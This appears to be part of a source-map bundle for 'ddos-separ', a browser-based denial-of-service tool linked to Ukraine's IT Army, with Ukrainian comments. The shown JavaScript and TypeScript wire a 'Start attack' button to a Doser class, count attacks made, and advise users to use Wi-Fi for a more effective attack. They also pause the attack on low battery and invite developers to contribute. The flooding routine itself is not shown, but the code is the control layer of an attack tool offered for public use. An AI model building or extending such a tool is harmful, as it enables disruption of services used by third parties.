false;\n\t\t\t\t});\n\t\t}\n\t}\n\n\t/** Зупинка атаки */\n\tstop() {\n\t\tclearInterval(this.attackCycle);\n\t\tthis.attack = false;\n\t\tconsole.clear();\n\t\tSounds.click.play();\n\t\tPanel.buttonText('Старт!');\n\t}\n}\n","/*!\nMIT License\n\nCopyright (c) 2022-2023 Yuriy Bogdan\n*/\nvar __awaiter = (this && this.__awaiter) || function (thisArg, _arguments, P, generator) {\n    function adopt(value) { return value instanceof P ? value : new P(function (resolve) { resolve(value); }); }\n    return new (P || (P = Promise))(function (resolve, reject) {\n        function fulfilled(value) { try { step(generator.next(value)); } catch (e) { reject(e); } }\n        function rejected(value) { try { step(generator[\"throw\"](value)); } catch (e) { reject(e); } }\n        function step(result) { result.done ? resolve(result.value) : adopt(result.value).then(fulfilled, rejected); }\n        step((generator = generator.apply(thisArg, _arguments || [])).next());\n    });\n};\n// @ts-nocheck\n$(() => __awaiter(this, void 0, void 0, function* () {\n    /*\n    Кхм. Зарплата прийшла?\n    Тоді можеш задонатити на ЗСУ прямо зараз - <https://uahelp.monobank.ua>\n\n    Дякую!\n    */\n    var _a;\n    // Ініціалізація класів\n    Panel = new Panel();\n    Sword = new Sword();\n    Doser = new Doser();\n    Panel.button.click(\n    /**Старт атаки*/ () => {\n        Sounds.click.play();\n        Doser.run();\n    });\n    $('#attacks-section').click(\n    /** Загальна кількість атак*/\n    () => Swal.fire('Атаки', `Взагалом атаковано: ${Database.attacks}`, 'info'));\n    if (Device.connection) {\n        if (Device.onLine) {\n            // Якщо заслабкий інтернет\n            if (!['3g', '4g', '5g'].includes((_a = Device.connection) === null || _a === void 0 ? void 0 : _a.effectiveType)) {\n                Swal.fire('Зауваження', 'У вас заслабкий інтернет!\\nДля ефективної атаки - підключіться до WI-FI', 'warning');\n            }\n        }\n    }\n    else\n        Swal.fire('Помилка', 'Немає підключення до інтернету!', 'error');\n    $(window).on({\n        /**\n         * Гарячі клавіші\n         * @param {KeyboardEvent} e Подія клавіатури (натискання клавіші)\n         */\n        keyup(e) {\n            switch (e.key) {\n                case ('Pause', 'Escape'):\n                    Doser.stop();\n                    break;\n            }\n        },\n    });\n    // Фішечки\n    if (Device.battery) {\n        const battery = yield Device.battery;\n        battery.onlevelchange = function () {\n            if (!this.charging) {\n                /** Рівень заряду батареї в відсотках */\n                const level = this.level * 100;\n                switch (level) {\n                    case (15, 11):\n                        Swal.fire('Увага!', `У вас сідає батарея (залишилось ${level}%)`, 'warning');\n                        break;\n                    case 10:\n                        /*\n                        Ми залишаємо 10% Резервного заряду задля того, щоб наша програма не зжирала батарею аж до нуля\n                        Бо якщо раптом телефон сяде, а тут світло ще вимкнули, так що ось запобіжник\n                        */\n                        Swal.fire('Увага!', 'Критично низький заряд батареї, атаку буде вимкнуто\\n\\\n                        Просимо поставити телефон на зарядку', 'warning').then(() => Doser.stop());\n                        break;\n                }\n            }\n        };\n    }\n    console.log('%cУВАГА!!!\\nНЕ ВСТАВЛЯЙТЕ сюди БУДЬ-ЯКІ КОДИ!, \\\nЦИМ МОЖЕ СКОРИСТАТИСЬ ВОРОГ, ПІДМІНИВШИ НАШІ ЦІЛІ НА ВОРОЖІ!\\n\\n\\\nТакож суворо забороняється вставляти коди навіть від українців, \\\nнам не можна відходити від курсу IT Армії, нам всім треба працювати разом і не розділятись', 'font-size: 16px;\\\n         font-family: system-ui;\\\n\t\t background-color: red;\\\n\t\t display: block;');\n    console.log('%cЯкщо ти розробник - можеш допомогти проекту 😎\\n\\\nhttps://github.com/BogdanDevUA/ddos-separ\\n\\n\\\nПостав зірочку 🌠, подай ідею або зроби пулл-реквест!\\n\\\nБуду дуже вдячний😊!', 'font-size: 16px;\\\n         font-family: system-ui;');\n}));\n// Слава Україні!\n","/*!\nMIT License\n\nCopyright (c) 2022-2023 Yuriy Bogdan\n*/\n\n// @ts-nocheck\n\n$(async () => {\n\t/*\n    Кхм. Зарплата прийшла?\n    Тоді можеш задонатити на ЗСУ прямо зараз - <https://uahelp.monobank.ua>\n\n    Дякую!\n    */\n\n\t// Ініціалізація класів\n\tPanel = new Panel();\n\tSword = new Sword();\n\tDoser = new Doser();\n\n\tPanel.button.click(\n\t\t/**Старт атаки*/ () => {\n\t\t\tSounds.click.play();\n\t\t\tDoser.run();\n\t\t}\n\t);\n\n\t$('#attacks-section').click(\n\t\t/** Загальна кількість атак*/\n\t\t() =>\n\t\t\tSwal.fire(\n\t\t\t\t'Атаки',\n\t\t\t\t`Взагалом атаковано: ${Database.attacks}`,\n\t\t\t\t'info'\n\t\t\t)\n\t);\n\n\tif (Device.connection) {\n\t\tif (Device.onLine) {\n\t\t\t// Якщо заслабкий інтернет\n\t\t\tif (\n\t\t\t\t!['3g', '4g', '5g'].includes(Device.connection?.effectiveType)\n\t\t\t) {\n\t\t\t\tSwal.fire(\n\t\t\t\t\t'Зауваження',\n\t\t\t\t\t'У вас заслабкий інтернет!\\nДля ефективної атаки - підключіться до WI-FI',\n\t\t\t\t\t'warning'\n\t\t\t\t);\n\t\t\t}\n\t\t}\n\t} else Swal.fire('Помилка', 'Немає підключення до інтернету!', 'error');\n\n\t$(window).on({\n\t\t/**\n\t\t * Гарячі клавіші\n\t\t * @param {KeyboardEvent} e Подія клавіатури (натискання клавіші)\n\t\t */\n\t\tkeyup(e: KeyboardEvent) {\n\t\t\tswitch (e.key) {\n\t\t\t\tcase ('Pause', 'Escape'):\n\t\t\t\t\tDoser.stop();\n\t\t\t\t\tbreak;\n\t\t\t}\n\t\t},\n\t});\n\n\t// Фішечки\n\n\tif (Device.battery) {\n\t\tconst battery = await Device.battery;\n\n\t\tbattery.onlevelchange = function () {\n\t\t\tif (!this.charging) {\n\t\t\t\t/** Рівень заряду батареї в відсотках */\n\t\t\t\tconst level = this.level * 100;\n\n\t\t\t\tswitch (level) {\n\t\t\t\t\tcase (15, 11):\n\t\t\t\t\t\tSwal.fire(\n\t\t\t\t\t\t\t'Увага!',\n\t\t\t\t\t\t\t`У вас сідає батарея (залишилось ${level}%)`,\n\t\t\t\t\t\t\t'warning'\n\t\t\t\t\t\t);\n\t\t\t\t\t\tbreak;\n\n\t\t\t\t\tcase 10:\n\t\t\t\t\t\t/*\n\t\t\t\t\t\tМи залишаємо 10% Резервного заряду задля того, щоб наша програма не зжирала батарею аж до нуля\n\t\t\t\t\t\tБо якщо раптом телефон сяде, а тут світло ще вимкнули, так що ось запобіжник\n\t\t\t\t\t\t*/\n\t\t\t\t\t\tSwal.fire(\n\t\t\t\t\t\t\t'Увага!',\n\t\t\t\t\t\t\t'Критично низький заряд батареї, атаку буде вимкнуто\\n\\\n                        Просимо поставити телефон на зарядку',\n\n\t\t\t\t\t\t\t'warning'\n\t\t\t\t\t\t).then(() => Doser.stop());\n\t\t\t\t\t\tbreak;\n\t\t\t\t}\n\t\t\t}\n\t\t};\n\t}\n\n\tconsole.log(\n\t\t'%cУВАГА!!!\\nНЕ ВСТАВЛЯЙТЕ сюди БУДЬ-ЯКІ КОДИ!, \\\nЦИМ МОЖЕ СКОРИСТАТИСЬ ВОРОГ, ПІДМІНИВШИ НАШІ ЦІЛІ НА ВОРОЖІ!\\n\\n\\\nТакож суворо забороняється вставляти коди навіть від українців, \\\nнам не можна відходити від курсу IT Армії, нам всім треба працювати разом і не розділятись',\n\n\t\t'font-size: 16px;\\\n         font-family: system-ui;\\\n\t\t background-color: red;\\\n\t\t display: block;'\n\t);\n\n\tconsole.log(\n\t\t'%cЯкщо ти розробник - можеш допомогти проекту 😎\\n\\\nhttps://github.com/BogdanDevUA/ddos-separ\\n\\n\\\nПостав зірочку 🌠, подай ідею або зроби пулл-реквест!\\n\\\nБуду дуже вдячний😊!',\n\n\t\t'font-size: 16px;\\\n         font-family: system-ui;'\n\t);\n});\n\n// Слава Україні!\n"]}